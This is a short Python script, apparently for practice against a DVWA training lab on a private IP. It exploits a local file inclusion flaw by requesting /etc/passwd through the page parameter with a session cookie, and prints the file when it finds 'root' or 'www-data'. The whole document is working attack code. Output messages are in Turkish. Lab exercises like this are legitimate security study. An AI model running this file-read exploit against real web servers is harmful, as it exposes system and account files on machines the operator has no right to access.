import requests
url="http://10.10.10.20/dvwa/vulnerabilities/fi/?page=/etc/passwd"
header={"Content-Type":"text/html","Cookie":"security=low; PHPSESSID=9e6f6a3b34cfa7ef5688c623249ad356"}
sonuc=requests.get(url=url,headers=header)
if "root" in sonuc.content or "www-data" in sonuc.content:
	print "[+]LFI olabilir"
	print sonuc.content
else:
	print "[-]LFI yok"
